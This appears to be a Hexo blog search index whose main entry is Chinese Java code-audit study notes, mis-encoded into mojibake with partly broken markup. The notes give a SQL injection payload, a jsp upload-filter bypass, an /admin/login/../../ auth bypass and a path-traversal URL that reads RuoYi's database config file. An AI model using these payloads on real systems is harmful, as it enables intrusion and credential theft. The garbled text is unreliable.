<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2025-24813 RCEå¤ç°</title>
    <link href="/2025/06/17/CVE-2025-24813-RCE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/06/17/CVE-2025-24813-RCE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/06/17/hello-world/"/>
    <url>/2025/06/17/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Javaä»£ç å®¡è®¡</title>
    <link href="/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="Javaä»£ç å®¡è®¡"><a href="#Javaä»£ç å®¡è®¡" class="headerlink" title="Javaä»£ç å®¡è®¡"></a>Javaä»£ç å®¡è®¡</h2><ul><li>è¯»æ‡‚ä¸€æ®µä»£ç ï¼šä»ä¸‹åˆ°ä¸Šè¿½è¸ªï¼Œæ‰¾åˆ°å˜é‡çš„ä¼ é€’ä¸å‡½æ•°ä¹‹é—´çš„å…³ç³»ï¼Œç†æ¸…ä»£ç å³å¯å¤§è‡´è¯»æ‡‚</li><li>åˆ†æå˜é‡ç»„æˆï¼šæ‰“å°å‡ºæ¯ä¸ªè¿‡ç¨‹å‚æ•°çš„å€¼é€ä¸ªåˆ†æ(è°ƒè¯•)</li></ul><h3 id="é€šç”¨æ­¥éª¤"><a href="#é€šç”¨æ­¥éª¤" class="headerlink" title="é€šç”¨æ­¥éª¤"></a>é€šç”¨æ­¥éª¤</h3><ul><li>å¯»æ‰¾æ¼æ´è§¦å‘ç‚¹</li><li>æ„é€ payloadå°è¯•åˆ©ç”¨æ¼æ´</li></ul><h3 id="checklist"><a href="#checklist" class="headerlink" title="checklist"></a>checklist</h3><p><a href="https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw">Javaä»£ç å®¡è®¡checklistï¼ˆä¸Šï¼‰ (qq.com)</a></p><p><a href="https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg">JAVAæ”»é˜²åŸºç¡€ä¹‹ä»£ç å®¡è®¡ (qq.com)</a></p><h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><ul><li><p>ä¸‰ä¸ªæ¨¡å¼</p><p>JDBCï¼ŒMybatisï¼ŒHibernate</p><p>JDBCä¸Mybatisï¼š<a href="https://blog.csdn.net/keyboard_/article/details/127477755">æŒä¹…å±‚æŠ€æœ¯å¯¹æ¯”ï¼šMybatis ä¸ JDBC çš„åŒºåˆ«åˆ°åº•åœ¨å“ªé‡Œ_jdbcå’Œmybatisçš„åº”ç”¨åœºæ™¯-CSDNåšå®¢</a></p></li><li><p>å‡ºç°æ³¨å…¥</p><ul><li>åŸç”ŸJDBCæ˜¯å¦å­˜åœ¨ç›´æ¥æ‹¼æ¥sqlè¯­å¥(ä½¿ç”¨+ï¼Œæˆ–è€…ä½¿ç”¨StringBuilder.append())ï¼Œæœªç»è¿‡é¢„ç¼–è¯‘</li><li>Mybatisä½¿ç”¨${}</li><li>Hibernate, JPAæ˜¯é»˜è®¤ç»è¿‡é¢„ç¼–è¯‘çš„ï¼Œä½†æ˜¯å¼€å‘è‡ªå·±ç¼–å†™çš„sqlè¯­å¥ï¼Œéœ€è¦æ£€æŸ¥</li></ul></li><li><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw">JAVAå¸¸ç”¨æ¡†æ¶SQLæ³¨å…¥å®¡è®¡ (qq.com)</a></p></li><li><p>åˆ¤æ–­æ¨¡å¼</p><ul><li>çœ‹é¡¹ç›®ä¸­è¯´æ˜ä½¿ç”¨çš„æŠ€æœ¯æ¡†æ¶</li><li>çœ‹å¼•ç”¨ä¸­åŠ è½½çš„é‚£äº›æŠ€æœ¯æ¡†æ¶</li><li>çœ‹é…ç½®æºç ä¸­ç›¸å…³çš„é…ç½®æ–‡ä»¶</li></ul></li><li><p>å…¥å£ç¡®å®š</p><ol><li>æ˜¯å¦ä½¿ç”¨é¢„ç¼–è¯‘æŠ€æœ¯ï¼Œé¢„ç¼–è¯‘æ˜¯å¦å®Œæ•´</li><li>å®šä½sqlè¯­å¥ä¸Šä¸‹æ–‡ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å‚æ•°ç›´æ¥æ‹¼æ¥ï¼Œæ˜¯å¦å¯¹æ¨¡ç³ŠæŸ¥è¯¢å…³é”®å­—çš„è¿‡æ»¤</li><li>Mybatisæ¡†æ¶åˆ™æœç´¢${}ï¼Œå››ç§æƒ…å†µæ— æ³•é¢„ç¼–è¯‘ï¼šlikeæ¨¡ç³ŠæŸ¥è¯¢ï¼Œorder byæ’åºï¼ŒèŒƒå›´æŸ¥è¯¢inï¼ŒåŠ¨æ€åˆ—åï¼Œè¡¨åï¼Œåªèƒ½æ‹¼æ¥ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦æ‰‹å·¥é˜²æ³¨å…¥</li></ol></li></ul><h4 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h4><ul><li>æ‰¾æ¨¡å¼</li><li>æœå…³é”®å­—</li><li>è¿½è¸ªç¡®å®šå¯æ§å˜é‡</li><li>ç¡®å®šè·¯ç”±</li><li>æ„é€ payloadæµ‹è¯•</li></ul><h4 id="jfinal-cmsæ¡ˆä¾‹"><a href="#jfinal-cmsæ¡ˆä¾‹" class="headerlink" title="jfinal_cmsæ¡ˆä¾‹"></a>jfinal_cmsæ¡ˆä¾‹</h4><ul><li><p>æŸ¥çœ‹é…ç½®æ–‡ä»¶å‘ç°æ˜¯JDBCé©±åŠ¨</p></li><li><p>å…¨å±€æœç´¢append()å…³é”®å­—ï¼Œå¯»æ‰¾ä¸sqlç›¸å…³çš„è¯­å¥</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A101.png"></p><p>å‘ç°æ–°å®šä¹‰äº†ä¸€ä¸ªsqlè¯­å¥ï¼Œå¹¶ä¸”ä½¿ç”¨äº†append()å‡½æ•°æ‹¼æ¥</p></li><li><p>åˆ¤æ–­orderByå˜é‡æ˜¯å¦å¯æ§ï¼Œæœ‰æ— è¿‡æ»¤</p><ul><li><p>è¿½è¸ªgetBaseForm()ç±»ä¸getOrderBy()æ–¹æ³•å‘ç°</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A102.png"></p></li></ul></li><li><p>æ‰¾åˆ°å¯¹åº”è·¯ç”±åè®¿é—®æŠ“åŒ…ï¼Œå‘ç°æ•°æ®åŒ…ä¸­æœ‰form.orderColumnå‚æ•°ï¼Œæ·»åŠ *å·æ”¾åˆ°sqlmapä¸­æµ‹è¯•payload</p></li></ul><h4 id="oa-system-masteræ¡ˆä¾‹"><a href="#oa-system-masteræ¡ˆä¾‹" class="headerlink" title="oa_system-masteræ¡ˆä¾‹"></a>oa_system-masteræ¡ˆä¾‹</h4><ul><li><p>æŸ¥çœ‹æ–‡å­—è¯´æ˜å‘ç°æ­¤oaç³»ç»Ÿä½¿ç”¨çš„æ˜¯Mybatisæ¡†æ¶</p></li><li><p>æŒ‡å®šæ–‡ä»¶æ©ç ä¸º *.xmlï¼Œå…¨å±€æœç´¢${</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A103.png"></p><p>è·³è½¬æŸ¥çœ‹baseKeyå‚æ•°ï¼Œå…¨å±€æœç´¢seleceçš„idå€¼sortMyNotice</p></li><li><p>å¯»æ‰¾baseKeyçš„å®ç°ï¼Œç¡®å®šè·¯ç”±ä¸º(&#x2F;informlistpaging)</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A104.png"></p></li><li><p>æ‰¾åˆ°è·¯ç”±åè®¿é—®æŠ“å–æ•°æ®åŒ…ï¼Œä½¿ç”¨sqlmapæµ‹è¯•payload</p></li></ul><h4 id="RuoYiæ¡ˆä¾‹"><a href="#RuoYiæ¡ˆä¾‹" class="headerlink" title="RuoYiæ¡ˆä¾‹"></a>RuoYiæ¡ˆä¾‹</h4><ul><li><p>åœ¨æºç ç®€ä»‹å¤„å‘ç°ä½¿ç”¨çš„Mybatisæ¡†æ¶</p></li><li><p>æœç´¢å…³é”®å­—${</p></li><li><p>æ‰¾åˆ°å¯èƒ½å­˜åœ¨ä¸å®‰å…¨å†™æ³•çš„åœ°æ–¹(ç­›é€‰å‡ºå¯èƒ½çš„æ³¨å…¥ç‚¹ï¼Œå¯æ‰§è¡Œsqlè¯­å¥)</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A105.png"></p><p>è¿½è¸ªupdateDeptStatusçš„ç”¨æ³•</p></li><li><p>å…¨å±€æœç´¢updateDeptStatuså…³é”®å­—é€ä¸ªæŸ¥æ‰¾ç”¨æ³•(å¯»æ‰¾è·¯ç”±å…³ç³»)</p></li><li><p>ç›´æ¥æœç´¢updateDeptStatuså…³é”®å­—å‘ç°æ­¤å…³é”®å­—å‡ºç°åœ¨serviceå±‚ä¸­</p><ul><li>åŸºäºspringbootä¸­ï¼Œæ‰§è¡Œsqlè¯­å¥çš„ä¸‰ä¸ªè°ƒç”¨<ul><li>ä¸šåŠ¡å±‚è°ƒç”¨Daoå±‚</li><li>controllerè°ƒç”¨serviceå±‚é—´æ¥è°ƒç”¨Daoå±‚</li><li>controllerç›´æ¥è°ƒç”¨Daoå±‚</li></ul></li><li>è·¯ç”±å…³ç³»ä¸€èˆ¬å†™åœ¨controllerä¸­</li></ul></li><li><p>é€‰ä¸­updateDeptStatuså…³é”®å­—ï¼Œç‚¹å‡»æŸ¥æ‰¾ç”¨æ³•ï¼Œå‘ç°updateDeptè°ƒç”¨äº†æ­¤æ–¹æ³•ï¼Œç»§ç»­è¿½è¸ªæ­¤æ–¹æ³•ï¼Œæ‰¾åˆ°SysDeptControlleræ–‡ä»¶ä¸­æœ‰è°ƒç”¨updateDeptæ–¹æ³•ï¼Œ</p><p>é¡ºåˆ©æ‰¾åˆ°è·¯ç”±å…³ç³»</p><p>${-&gt;updateDeptStatus-&gt;updateParentDeptStatus-&gt;updateDept-&gt;&#x2F;system&#x2F;dept&#x2F;edit</p></li><li><p>æµ‹è¯•payload</p><ul><li><p>ç›´æ¥è®¿é—®urlåœ°å€å‘ç°æŠ¥é”™</p></li><li><p>æ ¹æ®ä¸­æ–‡æ³¨é‡Šæ‰¾åˆ°åŠŸèƒ½ç‚¹æŠ“å–æ•°æ®åŒ…ï¼ŒæˆåŠŸæ‰¾åˆ°&#x2F;system&#x2F;dept&#x2F;editè·¯ç”±çš„æ•°æ®</p></li><li><p>å‘ç°æ•°æ®åŒ…ä¸­æ²¡æœ‰æ³¨å…¥å‚æ•°å€¼ï¼Œå°è¯•æ‰‹åŠ¨æ·»åŠ </p></li><li><p>ä½¿ç”¨sqlmapæ— æ³•æˆåŠŸæ³¨å…¥ï¼Œä½¿ç”¨æ‰‹å·¥æ³¨å…¥</p></li><li><pre><code class="language-java">DeptName=1&amp;DeptId=100&amp;ParentId=12&amp;&amp;status=0&amp;OrderNum=1&amp;ancestors=0)or(extractvalue(1,concat((select user()))));#<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">  -</span> ä½¿ç”¨æ‹¬å·ç»•è¿‡ç©ºæ ¼è¿‡æ»¤<br><br><span class="hljs-section">### æ–‡ä»¶å®‰å…¨</span><br><br>[<span class="hljs-string">Javaä»£ç å®¡è®¡ï¼šæ–‡ä»¶ç¯‡/æ–‡ä»¶ä¸Šä¼ /æ–‡ä»¶è¯»å–/ç›®å½•éå†_æ½œåœ¨è·¯å¾„éå†(æ–‡ä»¶è¯»å–) æ‰“å¼€æ–‡ä»¶ä»¥è¯»å–å…¶å†…å®¹ã€‚æ–‡ä»¶åæ¥è‡ªè¾“å…¥å‚æ•°ã€‚å¦‚æœå°†æœªè¿‡-CSDNåšå®¢</span>](<span class="hljs-link">https://blog.csdn.net/god_zzZ/article/details/108104523</span>)<br><br><span class="hljs-bullet">-</span> å…³é”®å­—æŸ¥è¯¢<br><br>  ![](<span class="hljs-link">image\javaå®¡è®¡06.png</span>)<br><br>  ![](<span class="hljs-link">image\javaå®¡è®¡07.png</span>)<br><br><span class="hljs-section">#### Inxeduæ¡ˆä¾‹(å‰å°æ–‡ä»¶ä¸Šä¼ )</span><br><br><span class="hljs-bullet">-</span> æ­å»ºç½‘ç«™åç›´æ¥å¯»æ‰¾åŠŸèƒ½ç‚¹ï¼Œå‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ <br><br><span class="hljs-bullet">-</span> å°è¯•ä¸Šä¼ æ–‡ä»¶æ‰¾åˆ°è·¯ç”±<br><br><span class="hljs-bullet">-</span> æ­¤ç½‘ç«™æºç å°†æ–‡ä»¶å®‰å…¨ä»£ç å°è£…åœ¨jaråŒ…ä¸­ï¼ŒImageUploadController.classï¼Œéœ€è¦é€šè¯»ç›®å½•ï¼Œç†æ¸…ç»“æ„æ‰èƒ½æ‰¾åˆ°<br><br><span class="hljs-bullet">-</span> æ ¹æ®ä¸Šä¼ æ–‡ä»¶æ—¶æ‰¾åˆ°çš„è·¯ç”±ï¼Œç¡®å®šæ§åˆ¶ä»£ç <br><br><span class="hljs-bullet">-</span> å‘ç°æ˜¯é»‘åå•è¿‡æ»¤ï¼Œåªè¿‡æ»¤jspæ–‡ä»¶<br><br>  ![](<span class="hljs-link">image\javaå®¡è®¡08.png</span>)<br><br><span class="hljs-bullet">-</span> ä½¿ç”¨å·¥å…·ç”Ÿæˆjspxæ–‡ä»¶ï¼Œä¿®æ”¹å‰ç«¯ç™½åå•è¿‡æ»¤ä»£ç ï¼ŒæˆåŠŸä¸Šä¼ <br><br><span class="hljs-section">#### Tmallæ¡ˆä¾‹</span><br><br><span class="hljs-section">##### åå°æ–‡ä»¶ä¸Šä¼ </span><br><br><span class="hljs-bullet">-</span> æœç´¢æ–‡ä»¶å®‰å…¨ç›¸å…³å…³é”®å­—<br><br><span class="hljs-bullet">-</span> æœç´¢new Fileï¼Œæ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ ç›¸å…³ä»£ç <br><br>  ![](<span class="hljs-link">image\javaå®¡è®¡09.png</span>)<br><br>  æ–‡ä»¶ä¸Šä¼ è¿‡æ»¤ä¸€èˆ¬å…³æ³¨åç¼€ï¼Œæ‰€ä»¥åœ¨æ­¤æ®µä»£ç ä¸­åº”è¯¥å…³æ³¨æ–‡ä»¶ååç¼€æ˜¯å¦‚ä½•è·å–çš„<br><br>  å‘ç°è¿™æ®µä»£ç æ˜¯ç›´æ¥è·å–äº†åŸæ–‡ä»¶åç¼€åå¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œè€Œæ˜¯ç›´æ¥ä¸Šä¼ äº†<br><br><span class="hljs-bullet">-</span> å¼€å§‹æµ‹è¯•ï¼Œå‘ç°æœ‰å‰ç«¯éªŒè¯ï¼ŒæŠ“åŒ…åæ›´æ”¹åç¼€ä¸ºjspå¯ä»¥æ­£å¸¸ä¸Šä¼ <br><br><span class="hljs-section">##### è¿‡æ»¤å™¨é‰´æƒ</span><br><br><span class="hljs-bullet">-</span> æ‰¾åˆ°è¿‡æ»¤å™¨æ ¸å¿ƒä»£ç AdminPermissionFilterç±»<br><br><span class="hljs-bullet">-</span> æ‰¾åˆ°æ ¸å¿ƒæ§åˆ¶æ–¹æ³•doFilter<br><br>  ![](<span class="hljs-link">image\javaå®¡è®¡10.png</span>)<br><br>  å‘ç°é‰´æƒå­˜åœ¨äº†æ¼æ´ï¼Œå®¹æ˜“è¶Šæƒ<br><br><span class="hljs-bullet">-</span> è¿›è¡Œæµ‹è¯•<br><br><span class="hljs-bullet">  -</span> åœ¨æ•°æ®åŒ…urlä¸­åŠ ä¸Š /admin/login/../../<br><span class="hljs-bullet">  -</span> æˆåŠŸç»•è¿‡é‰´æƒ<br><br><span class="hljs-section">#### RuoYi-4.5.0(æ–‡ä»¶ä¸‹è½½)</span><br><br><span class="hljs-bullet">-</span> æœç´¢å…³é”®å­—new FileInputStream<br><br>  ![](<span class="hljs-link">image\javaå®¡è®¡11.png</span>)<br><br>  æ‰¾åˆ°è¿™æ®µç›¸å…³ä»£ç æ§åˆ¶å­—èŠ‚è¾“å‡ºï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªç±»ä¸­æ²¡æœ‰è·¯ç”±å…³ç³»ï¼Œä¸èƒ½ç›´æ¥è§¦å‘æ­¤æ¼æ´<br><br><span class="hljs-bullet">-</span> å°è¯•æŸ¥æ‰¾æ˜¯å¦æœ‰ç”¨è¿‡writeBytesæ–¹æ³•<br><br><span class="hljs-bullet">-</span> æŸ¥æ‰¾ç”¨æ³•åå‘ç°ï¼ŒCommonControllerç±»ä¸­fileDownloadæ–¹æ³•å’ŒresourceDownloadæ–¹æ³•è°ƒç”¨äº†æ­¤æ–¹æ³•<br><br>  <span class="hljs-code">```java</span><br><span class="hljs-code">  @GetMapping(&quot;/common/download/resource&quot;)</span><br><span class="hljs-code">      public void resourceDownload(String resource, HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-code">              throws Exception</span><br><span class="hljs-code">      &#123;</span><br><span class="hljs-code">          // æœ¬åœ°èµ„æºè·¯å¾„</span><br><span class="hljs-code">          String localPath = Global.getProfile();</span><br><span class="hljs-code">          // æ•°æ®åº“èµ„æºåœ°å€</span><br><span class="hljs-code">          String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</span><br><span class="hljs-code">          // ä¸‹è½½åç§°</span><br><span class="hljs-code">          String downloadName = StringUtils.substringAfterLast(downloadPath, &quot;/&quot;);</span><br><span class="hljs-code">  </span><br><span class="hljs-code">          response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);</span><br><span class="hljs-code">          FileUtils.setAttachmentResponseHeader(response, downloadName);</span><br><span class="hljs-code">  </span><br><span class="hljs-code">          FileUtils.writeBytes(downloadPath, response.getOutputStream());</span><br><span class="hljs-code">      &#125;</span><br><span class="hljs-code">  &#125;</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><p>æ‰“å°å‡ºlocalPathä¸downloadPathçš„å€¼æŸ¥çœ‹resourceå‚æ•°æ˜¯å¦‚ä½•æ„æˆçš„</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A112.png"></p><p>ä»£ç é‡Šä¹‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * èµ„æºæ–‡ä»¶ä¸‹è½½æ¥å£</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> resource èµ„æºè·¯å¾„å‚æ•°ï¼ˆåŒ…å«èµ„æºæ ‡è¯†ç¬¦ï¼‰</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request HTTPè¯·æ±‚å¯¹è±¡</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response HTTPå“åº”å¯¹è±¡</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span>  <span class="hljs-comment">// å®šä¹‰GETè¯·æ±‚æ˜ å°„è·¯å¾„</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-comment">// è·å–æœ¬åœ°èµ„æºå­˜å‚¨çš„åŸºç¡€è·¯å¾„ï¼ˆä¾‹å¦‚ï¼šD:/upload/ï¼‰</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>    <br>    <span class="hljs-comment">// ä»resourceå‚æ•°ä¸­æˆªå–èµ„æºç›¸å¯¹è·¯å¾„ï¼Œå¹¶æ‹¼æ¥æˆå®Œæ•´ç‰©ç†è·¯å¾„</span><br>    <span class="hljs-comment">// ä¾‹å¦‚ï¼šresource=&quot;profile/xxx.jpg&quot; â†’ æˆªå–åå˜æˆ&quot;/xxx.jpg&quot; â†’ æœ€ç»ˆè·¯å¾„&quot;D:/upload/xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>    <br>    <span class="hljs-comment">// ä»å®Œæ•´è·¯å¾„ä¸­æå–æ–‡ä»¶åï¼ˆæœ€åä¸€ä¸ª/åçš„å†…å®¹ï¼‰</span><br>    <span class="hljs-comment">// ä¾‹å¦‚ï¼š&quot;D:/upload/xxx.jpg&quot; â†’ &quot;xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br><br>    <span class="hljs-comment">// è®¾ç½®å“åº”å†…å®¹ç±»å‹ä¸ºäºŒè¿›åˆ¶æµï¼ˆå¼ºåˆ¶æµè§ˆå™¨ä¸‹è½½è€Œä¸æ˜¯ç›´æ¥æ‰“å¼€ï¼‰</span><br>    response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>    <br>    <span class="hljs-comment">// è®¾ç½®å“åº”å¤´ï¼ŒæŒ‡å®šä¸‹è½½æ–‡ä»¶åï¼ˆè§£å†³ä¸­æ–‡ä¹±ç ç­‰é—®é¢˜ï¼‰</span><br>    FileUtils.setAttachmentResponseHeader(response, downloadName);<br><br>    <span class="hljs-comment">// å°†æ–‡ä»¶å†…å®¹å†™å…¥å“åº”è¾“å‡ºæµï¼ˆå®ç°ä¸‹è½½ï¼‰</span><br>    FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>&#125;<br></code></pre></td></tr></table></figure><p>localPathæ˜¯å¼€å‘äººå‘˜è‡ªå·±è®¾ç½®çš„æºä»£ç è·¯å¾„ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤..&#x2F;</p></li><li><p>æ„é€ payload(å®æˆ˜ä¸­è¦çŒœæµ‹æ–‡ä»¶æ‰€å¤„çš„ä½ç½®ï¼Œæ–‡ä»¶å¤¹åç§°)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8088//common/download/resource?resource=/profile/../RuoYi-v4.5.0/ruoyi-admin/src/main/resources/application-druid.yml<br></code></pre></td></tr></table></figure></li><li><p>åœ¨v4.6.0ç‰ˆæœ¬ä¸­çš„åŒæ ·ä½ç½®æ‰¾åˆ°æ–°ç‰ˆæœ¬ä¿®å¤äº†æ­¤æ¼æ´ï¼Œè¿‡æ»¤äº†..&#x2F;ï¼Œå¤šäº†æ£€æµ‹è§„åˆ™</p></li></ul><h4 id="oa-system-masteræ¡ˆä¾‹-æ–‡ä»¶è¯»å–"><a href="#oa-system-masteræ¡ˆä¾‹-æ–‡ä»¶è¯»å–" class="headerlink" title="oa-system-masteræ¡ˆä¾‹(æ–‡ä»¶è¯»å–)"></a>oa-system-masteræ¡ˆä¾‹(æ–‡ä»¶è¯»å–)</h4><ul><li><p>æœç´¢å…³é”®å­—FileInputStream</p><p>æ‰¾åˆ°ä¸€æ®µç›¸å…³ä»£ç ï¼Œå¼€å§‹å®¡è®¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;image/**&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">image</span><span class="hljs-params">(Model model, HttpServletResponse response, <span class="hljs-meta">@SessionAttribute(&quot;userId&quot;)</span> Long userId, HttpServletRequest request)</span><br><span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">projectPath</span> <span class="hljs-operator">=</span> ClassUtils.getDefaultClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>).getPath();<br>System.out.println(projectPath);<br><span class="hljs-type">String</span> <span class="hljs-variable">startpath</span> <span class="hljs-operator">=</span> <span 